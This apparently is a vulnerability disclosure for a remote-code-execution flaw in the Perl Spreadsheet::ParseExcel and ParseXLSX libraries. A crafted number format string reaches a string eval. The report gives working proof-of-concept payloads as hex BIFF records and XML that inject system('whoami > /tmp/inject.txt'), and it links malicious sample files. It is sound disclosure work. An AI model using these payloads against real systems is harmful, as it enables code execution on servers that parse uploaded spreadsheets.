# ParseExcel security vulnerabilitiy

> TL;DR: RCE from logic in parsing format strings.

## Short explanation on the exploit

Root cause of the exploitation comes from calling `eval` to an unvalidated user input in `Utility.pm`

https://github.com/jmcnamara/spreadsheet-parseexcel/blob/e33d626d9b9cec91be7520dec1686712313957fb/lib/Spreadsheet/ParseExcel/Utility.pm#L171
```perl
# Uitlity.pm
sub ExcelFmt {
	my ( $format_str, $number, $is_1904, $number_type, $want_subformats ) = @_;

	return $number unless $number =~ $qrNUMBER;
	
	my $conditional;
	if ( $format_str =~ /^\[([<>=][^\]]+)\](.*)$/ ) {
		$conditional = $1;
		$format_str  = $2;
	}

	#...

	if ($conditional) {
		# TODO. Replace string eval with a function.
		$section = eval "$number $conditional" ? 0 : 1;
	}
    #...
}
```

According to what I inspected, current implementation for this flow lacks proper validation, while using `eval` for handling comparison logics is too "over kill" in this case. Because of this, both `ParseExcel::parse` and `ParseXLSX::parse` (used for reading data from Excel files) are vulnearble to RCE.

### Where's `$format_str`?
`ValFmt` is the most possible caller of `ExcelFmt`, so I'll explain further into this method
https://github.com/jmcnamara/spreadsheet-parseexcel/blob/e33d626d9b9cec91be7520dec1686712313957fb/lib/Spreadsheet/ParseExcel/FmtDefault.pm#L141-L161
```perl
sub ValFmt {
    my ( $oThis, $oCell, $oBook ) = @_;

    my ( $Dt, $iFmtIdx, $iNumeric, $Flg1904 );

    if ( $oCell->{Type} eq 'Text' ) {
        $Dt =
          ( ( defined $oCell->{Val} ) && ( $oCell->{Val} ne '' ) )
          ? $oThis->TextFmt( $oCell->{Val}, $oCell->{Code} ) # Perform some encoding logic => doesn't cause RCE
          : '';

        return $Dt;
    }
    else {
        $Dt      = $oCell->{Val};
        $Flg1904 = $oBook->{Flg1904};
        my $sFmtStr = $oThis->FmtString( $oCell, $oBook );

        # where RCE lies => $oCell->{Type} must be either "Date" or "Number"
        return ExcelFmt( $sFmtStr, $Dt, $Flg1904, $oCell->{Type} ); 
    }
}
```
If `$oCell->{Type}` is `Date` or `Number`, `ExcelFmt` will be called.

The value `$format_str` is the returned from another method: `FmtString`
https://github.com/jmcnamara/spreadsheet-parseexcel/blob/e33d626d9b9cec91be7520dec1686712313957fb/lib/Spreadsheet/ParseExcel/FmtDefault.pm#L101-L136
```perl
sub FmtString {
    my ( $oThis, $oCell, $oBook ) = @_;

    my $sFmtStr =
      $oThis->FmtStringDef( $oBook->{Format}[ $oCell->{FormatNo} ]->{FmtIdx},
        $oBook ); # maps to the correct format string
        
    #...

    unless ( defined($sFmtStr) ) {
        # assigns default format string depending on the value, can ignore
        #...
    }
    return $sFmtStr;
}
```
Another function is being called, so we'll examine `FmtStringDef` as well
https://github.com/jmcnamara/spreadsheet-parseexcel/blob/e33d626d9b9cec91be7520dec1686712313957fb/lib/Spreadsheet/ParseExcel/FmtDefault.pm#L87-L96
```perl
sub FmtStringDef {
    my ( $oThis, $iFmtIdx, $oBook, $rhFmt ) = @_;
    my $sFmtStr = $oBook->{FormatStr}->{$iFmtIdx}; # does the mapping

    # More with assigning default format string, can ignore
    #...
}
```

All variables are clear, we can conclude the attack vector as follows:
- Inject the malicious format string with index `$iFmtIdx`
- Make sure a cell format `$oBook->{Format}[$cellFmtIdx]` maps to `$iFmtIdx`
- Make sure a cell maps to that cell format (`$oCell->{FormatNo} = $cellFmtIdx`)
![[flow 1.png]] 

In the sections below, I'll go over detailed explanation of how the payload propagated the shell code to `eval` command. There will be 2 sections for parsing .xls file using `ParseExcel` and parsing .xlsx file using `ParseXLSX`.

## PoC
To demonstrate, below is the link to our crafted malicious Excel files (in .xls and .xlsx) that runs `whoami` and stores result to `/tmp/inject.txt` file.
https://gist.github.com/haile01/0f4f19e4441895ef33ff27385080478b

### Exploitation on XLS file
Take a simple Perl program to parse xls file like below, which uses `ParseExcel::parse`. RCE will happen while the parsing is performed, even before any data is fetched.

```perl
use strict;
use Spreadsheet::ParseExcel;

my $parser = Spreadsheet::ParseExcel->new();
# file.xls is malicious file from end user
my $workbook = $parser->parse("test.xls");
```

#### Injecting format string
Excel 97 binary files is structured in to chunks of binary data called BIFF record. Each record starts with a header called `opCode` (in little-endian), then the length of the record and it's actual data.

https://github.com/jmcnamara/spreadsheet-parseexcel/blob/19ea68d2ebf640e06df4f6937fcb43d76a5ec96b/lib/Spreadsheet/ParseExcel.pm#L438
```perl
sub QueryNext {
    my ( $q ) = @_;


    if ( $q->{streamPos} + 4 >= $q->{streamLen} ) {
        return 0;
    }

    my $data = substr( $q->{stream}, $q->{streamPos}, 4 );

    ( $q->{opcode}, $q->{length} ) = unpack( 'v2', $data );

    # No biff record should be larger than around 20,000.
    if ( $q->{length} >= 20000 ) {
        return 0;
    }

    if ( $q->{length} > 0 ) {
        $q->{data} = substr( $q->{stream}, $q->{streamPos} + 4, $q->{length} );
    }
    else {
        $q->{data}                     = undef;
        $q->{dont_decrypt_next_record} = 1;
    }

    if ( $q->{encryption} == MS_BIFF_CRYPTO_RC4 ) {
        # Handles with decryption
    }
    elsif ( $q->{encryption} == MS_BIFF_CRYPTO_XOR ) {
        # not implemented
        return 0;
    }
    elsif ( $q->{encryption} == MS_BIFF_CRYPTO_NONE ) {

    }

    $q->{streamPos} += 4 + $q->{length};

    return 1;
}
```

After that, a corresponding handler for record type is used to extract that BIFF record data.
https://github.com/jmcnamara/spreadsheet-parseexcel/blob/19ea68d2ebf640e06df4f6937fcb43d76a5ec96b/lib/Spreadsheet/ParseExcel.pm#L576-L580

```perl
if ( defined $self->{FuncTbl}->{$record} && !$workbook->{_skip_chart} )
{
		$self->{FuncTbl}->{$record}
			->( $workbook, $record, $record_length, $record_header );
}
```

Format string is handled by `_subFormat`, with `opCode = 0x41E` 
https://github.com/jmcnamara/spreadsheet-parseexcel/blob/19ea68d2ebf640e06df4f6937fcb43d76a5ec96b/lib/Spreadsheet/ParseExcel.pm#L1563-L1585
```perl
sub _subFormat {

    my ( $oBook, $bOp, $bLen, $sWk ) = @_;
    my $sFmt;

    if ( $oBook->{BIFFVersion} <= verBIFF5 ) {
        $sFmt = substr( $sWk, 3, unpack( 'c', substr( $sWk, 2, 1 ) ) );
        $sFmt = $oBook->{FmtClass}->TextFmt( $sFmt, '_native_' );
    }
    else {
        $sFmt = _convBIFF8String( $oBook, substr( $sWk, 2 ) );
    }

    my $format_index = unpack( 'v', substr( $sWk, 0, 2 ) );

    # Excel 4 and earlier used an index of 0 to indicate that a built-in format
    # that was stored implicitly.
    if ( $oBook->{BIFFVersion} <= verBIFF4 && $format_index == 0 ) {
        $format_index = keys %{ $oBook->{FormatStr} };
    }

    $oBook->{FormatStr}->{$format_index} = $sFmt;
}
```

I wasn't sure which BIFF version being used in my .xls file but according to the data in the binary file, it should match with the `else` case (> `verBIFF5`).

Structure of format string record in newer BIFF versions should be
**1E 04 \[record length - 2 bytes\] \[format string index - 2 bytes\] \[format string length - 1 byte\] \[string flags - 2 bytes\] \[format string content\]**

By following the correct structure, I can inject any format string into the .xls file.

The actual BIFF record for format string I injected in the PoC (format string index is `\x00\xa5`)
```
00000000: 1e04 3100 a500 2c00 005b 3e31 3233 3b73  ..1...,..[>123;s
                    ^^^^
		        format string index
00000010: 7973 7465 6d28 2777 686f 616d 6920 3e20  ystem('whoami >
00000020: 2f74 6d70 2f69 6e6a 6563 742e 7478 7427  /tmp/inject.txt'
00000030: 295d 3132 33                             )]123
```

#### Mapping a cell format to the format string
Cell formats will define many properties for a cell, such as format string, styling, fonts, ... One cell format can link to one format string by including format string's index inside their BIFF record. This logic is handled by `_subXf`
https://github.com/jmcnamara/spreadsheet-parseexcel/blob/19ea68d2ebf640e06df4f6937fcb43d76a5ec96b/lib/Spreadsheet/ParseExcel.pm#L1441-L1558

```perl
sub _subXF {
    my ( $oBook, $bOp, $bLen, $sWk ) = @_;
    
    #...

    if ( $oBook->{BIFFVersion} == verBIFF4 ) {
        #...
    }
    elsif ( $oBook->{BIFFVersion} == verBIFF8 ) {
        my ( $iGen, $iAlign, $iGen2, $iBdr1, $iBdr2, $iBdr3, $iPtn );

        ( $iFnt, $iIdx, $iGen, $iAlign, $iGen2, $iBdr1, $iBdr2, $iBdr3, $iPtn )
          = unpack( "v7Vv", $sWk );
        #...
    }
    else {
        ( $iFnt, $iIdx, $iGen, $iAlign, $iPtn, $iPtn2, $iBdr1, $iBdr2 ) =
          unpack( "v8", $sWk );
        #...
    }

    push @{ $oBook->{Format} }, Spreadsheet::ParseExcel::Format->new(
        FontNo => $iFnt,
        Font   => $oBook->{Font}[$iFnt],
        FmtIdx => $iIdx, # <- the index that points to format string index
        #...
    );
}
```
Because our `BIFFVersion` is greater than BIFF5, the condition shouldn't fall into the first case. For the other two, we know that `$iIdx` is the second word in BIFF data. That's why it's trivial to perform this step also.

The actual BIFF record for cell format I used in the PoC
```
00000000: e000 1400 0000 a500 f5ff 2000 0000 0000  .......... .....
                         ^^^^
                  format string index
00000010: 0000 0000 0000 c020                      .......
```
More over, cell formats are identified by its index in a list, so I modified the first record, then my cell format index should be `0`

#### Mapping a cell to the cell format
For a cell to apply a format, it should include the ID of the cell format inside the cell's BIFF record. However, as I mentioned before, only cell with type `Number` or `Date` can trigger the RCE, so I'll use a cell with date type for the PoC (refered as RK BIFF record).
https://github.com/jmcnamara/spreadsheet-parseexcel/blob/19ea68d2ebf640e06df4f6937fcb43d76a5ec96b/lib/Spreadsheet/ParseExcel.pm#L918-L939

```perl
sub _subRK {
    my ( $workbook, $biff_number, $length, $data ) = @_;
    my ( $row, $col, $format_index, $rk_number ) = unpack( 'vvvV', $data );
    my $number = _decode_rk_number( $rk_number );

    _NewCell(
        $workbook, $row, $col,
        Kind     => 'RK',
        Val      => $number,
        FormatNo => $format_index,
        Format   => $workbook->{Format}->[$format_index],
        Numeric  => 1,
        Code     => undef,
        Book     => $workbook,
    );
    #... 
}
```
We can see that the index that maps to a cell format is now the third word of the record, so all we need to do is null-out this word into `\x00`

The actual BIFF record for date cell I used in the PoC
```
00000000: 7e02 0a00 0000 0000 0000 201a e240       ~......... ..@
                              ^^^^
	                        format index
```

Note that the method `_subRK` haven't explicitly define the type `Date` yet. Type checking is implemented in `chkType` instead
https://github.com/jmcnamara/spreadsheet-parseexcel/blob/e33d626d9b9cec91be7520dec1686712313957fb/lib/Spreadsheet/ParseExcel/FmtDefault.pm#L166-L181

```perl
sub ChkType {
    my ( $oPkg, $iNumeric, $iFmtIdx ) = @_;
    if ($iNumeric) {
        if (   ( ( $iFmtIdx >= 0x0E ) && ( $iFmtIdx <= 0x16 ) )
            || ( ( $iFmtIdx >= 0x2D ) && ( $iFmtIdx <= 0x2F ) ) )
        {
            return "Date";
        }
        else {
            return "Numeric";
        }
    }
    else {
        return "Text";
    }
}
```
Since `$iNumeric` is set to `1`, we are sure that type is not `Text`

Finally, when initializing a new `Cell` object, `ValFmt` will be called and continue with the execution chain, propagate our shell to `eval` method.
https://github.com/jmcnamara/spreadsheet-parseexcel/blob/e33d626d9b9cec91be7520dec1686712313957fb/lib/Spreadsheet/ParseExcel.pm#L2375-L2433

### Exploitation on XLSX file
Working with .xlsx file is quite easier, since we can directly modify the data in plaintext (xml format).
Take a simple Perl program to parse xls file like below, which uses `ParseXLSX::parse`. RCE will happen while the parsing is performed, even before any data is fetched.

```perl
use strict;
use Spreadsheet::ParseExcel;
use Spreadsheet::ParseXLSX;

my $parser = Spreadsheet::ParseXLSX->new();
# file.xlsx is malicious file from end user
my $workbook = $parser->parse("test.xlsx");
```
XLSX file is a zip file that compresses many xml files, each containing specific types of data of the workbook.
Below is the example of folder structure:
```
|- [Content_Types].xml 
|- _rels
|- docProps
	|- app.xml
	|- core.xml
|- xl
	|- _rels   
		|- workbook.xml.rels          
	|- styles.xml              <--- Format strings & cell formats       
	|- workbook.xml
	|- sharedStrings.xml 
	|- theme             
		|- theme1.xml
	|- worksheets
		|- sheet1.xml            <--- Cell values
```

#### Injecting format string & mapping to a cell format
Format string is included in `xl/styles.xml` file, under `<numFmts>` tag, while cell formats are defined under `<cellXfs>` tag.
https://github.com/doy/spreadsheet-parsexlsx/blob/80198923186bedda61d4dceb0272210dc8bec533/lib/Spreadsheet/ParseXLSX.pm#L630-L923

```perl
sub _parse_styles {
    # ...
    my %format_str = (
        %default_format_str,
        (map {
            $_->att('numFmtId') => $_->att('formatCode')
        } $styles->find_nodes('//s:numFmts/s:numFmt')),
    );
    # ...
    my @format = map {
        my %opts = (
            %default_format_opts,
            %ignore,
        );
        # ...
        $opts{FmtIdx}   = 0+($xml_fmt->att('numFmtId')||0);
        # ...
        Spreadsheet::ParseExcel::Format->new(%opts)
    } $styles->find_nodes('//s:cellXfs/s:xf');
    # ...
    
    
    return {
        FormatStr => \%format_str,
        Font      => \@font,
        Format    => \@format,
    }
}
```

To inject a format string, we need to add a `<numFmt>` tag, with `formatCode` being the format string, and `numFmtId` being any integer value we want. Here I used `123`.

After that, we'll add one more `<xf>` cell to map to the format string, where `numFmtId` attribute being our chosen id (`123`)

The final xml data I used in the PoC
```xml
<!-- xl/styles.xml -->
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<styleSheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:x14ac="http://schemas.microsoft.com/office/spreadsheetml/2009/9/ac" xmlns:x16r2="http://schemas.microsoft.com/office/spreadsheetml/2015/02/main" xmlns:xr="http://schemas.microsoft.com/office/spreadsheetml/2014/revision" mc:Ignorable="x14ac x16r2 xr">
...
  <numFmts count="1">
    <!-- injected format string -->
    <numFmt numFmtId="123" formatCode="[>123;system('whoami > /tmp/inject.txt')]123"/>
  </numFmts> 
...
  <cellXfs count="4">
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0"/>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1"/>
    <!-- injected cell format -->
    <xf numFmtId="123" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1"/>
  </cellXfs>
...
</styleSheet>
```

#### Mapping a cell to the cell format
https://github.com/doy/spreadsheet-parsexlsx/blob/80198923186bedda61d4dceb0272210dc8bec533/lib/Spreadsheet/ParseXLSX.pm#L205-L487
```perl
sub _parse_sheet {
    my $sheet_xml = $self->_new_twig(
        twig_roots => {
            #...
            's:sheetData/s:row' => sub {
                my ( $twig, $row_elt ) = @_;
                for my $cell ( $row_elt->children('s:c') ){
                    my $type = $cell->att('t') || 'n';
                    my $val = $val_xml ? $val_xml->text : undef;

                    #...
                    elsif ($type eq 'n') {
                        $long_type = 'Numeric';
                        $val = defined($val) ? 0+$val : undef;
                    }
                    elsif ($type eq 'd') {
                        $long_type = 'Date';
                    }
                    # other $type results into $long_type = 'Text'
                    #...
                    
                    my $format_idx = $cell->att('s') || 0;
                    my $format = $sheet->{_Book}{Format}[$format_idx];
                    die "unknown format $format_idx" unless $format;
                    
                    my $cell = Spreadsheet::ParseExcel::Cell->new(
                        Val      => $val,
                        Type     => $long_type,
                        Merged   => undef, # fix up later
                        Format   => $format,
                        FormatNo => $format_idx,
                        ($formula
                            ? (Formula => $formula->text)
                            : ()),
                        Rich     => $Rich,
                    );
                    $cell->{_Value} = $sheet->{_Book}{FmtClass}->ValFmt(
                        $cell, $sheet->{_Book}
                    );
                }
            }
        }
    )
}
```
Logic for reading cell data in this library is more straightforward, only assign the type & value directly from xml tag attributes. Since we need `$oCell->{Type}` to be `Date` or `Numeric`, we just need attribute `t` to be `d` or `n`. To map the cell to the cell format, we'll also set attribute `s` to be the index of the cell format (`3`).

The final xml data I used in the PoC
```xml
<!-- xl/worksheets/sheet1.xml -->
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:x14ac="http://schemas.microsoft.com/office/spreadsheetml/2009/9/ac" xmlns:xr="http://schemas.microsoft.com/office/spreadsheetml/2014/revision" xmlns:xr2="http://schemas.microsoft.com/office/spreadsheetml/2015/revision2" xmlns:xr3="http://schemas.microsoft.com/office/spreadsheetml/2016/revision3" mc:Ignorable="x14ac xr xr2 xr3" xr:uid="{39528CB2-0246-0542-84DC-33008C4AE4F2}">
  ...
  <sheetData>
    <row r="1" spans="1:2" x14ac:dyDescent="0.2">
      <c r="A1" s="3" t="n"> <!-- 3 is the order of our cell format -->
        <v>0</v>
      </c>
      <c r="B1" s="2"/>
    </row>
  </sheetData>
  ...
</worksheet>
`
